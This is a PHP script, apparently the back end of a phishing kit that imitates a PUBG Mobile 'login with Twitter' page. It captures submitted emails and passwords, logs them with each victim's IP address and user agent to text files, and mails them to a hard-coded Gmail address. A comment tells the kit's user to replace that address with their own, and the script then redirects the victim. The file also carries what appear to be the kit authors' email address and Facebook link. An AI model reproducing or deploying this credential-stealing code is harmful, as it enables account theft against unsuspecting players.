<?php
$emailkamu = "dendisaimam5@gmail.com"; //ganti emailnya ente
$etw = $_POST['etw'];
$ptw = $_POST['ptw'];
$ip = $_SERVER['REMOTE_ADDR'];

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");
if (!empty($_POST["etw"])){
                if (!empty($_POST["ptw"])){
                        $buka=fopen("LOG-ACCOUNT.txt","a+");
                        $tulis=fopen("RESULT.txt","w");
                        fwrite($buka,"\n\r[+] RESULT PUBG Boss !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["etw"]."\n[+] Passwordnya: ".$_POST["ptw"]."\n[+] Ip Address : $ip\n\r[+] User Agent : $user_agent\n\r");
                        fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["etw"]."\n\r[=] Pasword: ".$_POST["ptw"]);
                        fclose($buka);
                        fclose($tulis);
$subject = "PUBG Mobile | Login Twitter | '.$etw.'";
$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: black;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://lh4.googleusercontent.com/proxy/8xchLnm3oiwD_vKcGW8a75R9M7tx3yThsRE_kF2r73Q-UwdBvw0Nt3ecfq-AbJ4dZ6beHkhzVpWuWUngpAGNJp0HCRL8JBUO4DayQFkaRxT74XnEAtd6mEo5db-wK8HXdQPs_A=w384-h384-nc">
<img width="40" style="float:right;" src="http://pubgmobile.com/en-US/m/images/icon_logom.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$etw.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$ptw.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
  <th style="width:78%;text-align:center;"><b>TWITTER</th> 
 </tr>
</table>
<div style="padding:5px;width:294;height:40px;background: black;color:#ffc;text-align:center;">
<font size="3"><b>https://web.facebook.com/sahrulkhan007</b></font>
</br>
<font size="2"><b></b></font>
</div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: | Mr.cakil | <mrcakil@programmer.net><result>' . "\r\n";
$datamail = mail($emailkamu, $subject, $message, $headersx);
}
}
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=collect.php">
</head>
<body>
</body>
</html>
    
